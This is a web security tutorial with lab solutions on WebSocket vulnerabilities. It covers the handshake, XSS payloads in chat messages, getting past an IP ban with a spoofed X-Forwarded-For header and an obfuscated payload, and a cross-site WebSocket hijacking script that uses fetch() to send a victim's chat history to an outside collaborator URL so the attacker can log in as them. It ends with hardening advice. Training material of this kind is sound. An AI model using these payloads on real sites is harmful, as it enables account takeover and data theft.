# Testing for WebSockets security vulnerabilities

WebSockets are widely used in modern web applications. They are initiated over HTTP and provide long-lived connections with asynchronous communication in both directions.

WebSockets are a bi-directional, full duplex communications protocol initiated over HTTP. 

WebSockets are particularly useful in situations where low-latency or server-initiated messages are required, such as real-time feeds of financial data.

WebSocket connections are normally created using client-side JavaScript like the following:

```var ws = new WebSocket("wss://normal-website.com/chat");```

To establish the connection, the browser and server perform a WebSocket handshake over HTTP. The browser issues a WebSocket handshake request like the following:

```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

If the server accepts the connection, it returns a WebSocket handshake response like the following:

```
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

At this point, the network connection remains open and can be used to send WebSocket messages in either direction.

# Manipulating WebSocket traffic

## Manipulating WebSocket messages to exploit vulnerabilities

Chat application uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a WebSocket message like the following is sent to the server:

```{"message":"Hello Carlos"}```

The contents of the message are transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows:

```<td>Hello Carlos</td>```

In this situation, provided no other input processing or defenses are in play, an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message:

```{"message":"<img src=1 onerror='alert(1)'>"}```

### Manipulating WebSocket messages to exploit vulnerabilities

This online shop has a live chat feature implemented using WebSockets.
Chat messages that you submit are viewed by a support agent in real time.
To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser.

**Solution**

1. Click "Live chat" and send a chat message.
2. In Burp Proxy, go to the WebSockets history tab, and observe that the chat message has been sent via a WebSocket message.
3. Using the browser, send a new message containing a < character.
4. In Burp Proxy, find the corresponding WebSocket message and observe that the < has been HTML-encoded by the client before sending.
5. Ensure that Burp Proxy is configured to intercept WebSocket messages, then send another chat message.
6. Edit the intercepted message to contain the following payload:

    ```<img src=1 onerror='alert(1)'>```
7. Observe that an alert is triggered in the browser. This will also happen in the support agent's browser.

## Manipulating the WebSocket handshake to exploit vulnerabilities

- Misplaced trust in HTTP headers to perform security decisions, such as the X-Forwarded-For header.
- Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
- Attack surface introduced by custom HTTP headers used by the application.

### Manipulating the WebSocket handshake to exploit vulnerabilities

This online shop has a live chat feature implemented using WebSockets.
It has an aggressive but flawed XSS filter.
To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser.

**Solution**

1. Click "Live chat" and send a chat message.
2. In Burp Proxy, go to the WebSockets history tab, and observe that the chat message has been sent via a WebSocket message.
3. Right-click on the message and select "Send to Repeater".
4. Edit and resend the message containing a basic XSS payload, such as:

    ```<img src=1 onerror='alert(1)'>```

5. Observe that the attack has been blocked, and that your WebSocket connection has been terminated.
6. Click "Reconnect", and observe that the connection attempt fails because your IP address has been banned.
7. Add the following header to the handshake request to spoof your IP address:

    ```X-Forwarded-For: 1.1.1.1```
8. Click "Connect" to successfully reconnect the WebSocket.
9. Send a WebSocket message containing an obfuscated XSS payload, such as:

    ```<img src=1 oNeRrOr=alert`1`>```

## Using cross-site WebSockets to exploit vulnerabilities

Some WebSockets security vulnerabilities arise when an attacker makes a cross-domain WebSocket connection from a web site that the attacker controls. This is known as a **cross-site WebSocket hijacking** attack, and it involves exploiting a **cross-site request forgery (CSRF)** vulnerability on a WebSocket handshake. The attack often has a serious impact, allowing an attacker to perform privileged actions on behalf of the victim user or capture sensitive data to which the victim user has access.

# (CSWSH) Cross-site WebSocket hijacking

It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.

An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application.

The attacker's page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server. This means that, unlike regular CSRF, the attacker gains two-way interaction with the compromised application.

## Impact of cross-site WebSocket hijacking

- **Perform unauthorized actions masquerading as the victim user.** As with regular CSRF, the attacker can send arbitrary messages to the server-side application. If the application uses client-generated WebSocket messages to perform any sensitive actions, then the attacker can generate suitable messages cross-domain and trigger those actions.
- **Retrieve sensitive data that the user can access.** Unlike with regular CSRF, cross-site WebSocket hijacking gives the attacker two-way interaction with the vulnerable application over the hijacked WebSocket. If the application uses server-generated WebSocket messages to return any sensitive data to the user, then the attacker can intercept those messages and capture the victim user's data.

### Cross-site WebSocket hijacking

This online shop has a live chat feature implemented using WebSockets.
To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account.

**Solution**

1. Click "Live chat" and send a chat message.
2. Reload the page.
3. In Burp Proxy, in the WebSockets history tab, observe that the "READY" command retrieves past chat messages from the server.
4. In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no CSRF tokens.
5. Right-click on the handshake request and select "Copy URL".
6. In the browser, go to the exploit server and paste the following template into the "Body" section:

    ```
    <script>
        var ws = new WebSocket('wss://your-websocket-url');
        ws.onopen = function() {
            ws.send("READY");
        };
        ws.onmessage = function(event) {
            fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
        };
    </script>
    ```

7. Replace *your-websocket-url* with the URL from the WebSocket handshake (*your-lab-id.web-security-academy.net/chat*). Make sure you change the protocol from *https://* to *wss://*. Replace *your-collaborator-url* with a payload generated by Burp Collaborator Client.
8. Click "View exploit".
9. Poll for interactions using Burp Collaborator client. Verify that the attack has successfully retrieved your chat history and exfiltrated it via Burp Collaborator. For every message in the chat, Burp Collaborator has received an HTTP request. The request body contains the full contents of the chat message in JSON format. Note that these messages may not be received in the correct order.
10. Go back to the exploit server and deliver the exploit to the victim.
11. Poll for interactions using Burp Collaborator client again. Observe that you've received more HTTP interactions containing the victim's chat history. Examine the messages and notice that one of them contains the victim's username and password.
12. Use the exfiltrated credentials to log in to the victim user's account.

## How to secure a WebSocket connection

To minimize the risk of security vulnerabilities arising with WebSockets, use the following guidelines:

- Use the wss:// protocol (WebSockets over TLS).
- Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL.
- Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities.
- Treat data received via the WebSocket as untrusted in both directions. Handle data safely on both the server and client ends, to prevent input-based vulnerabilities such as SQL injection and cross-site scripting.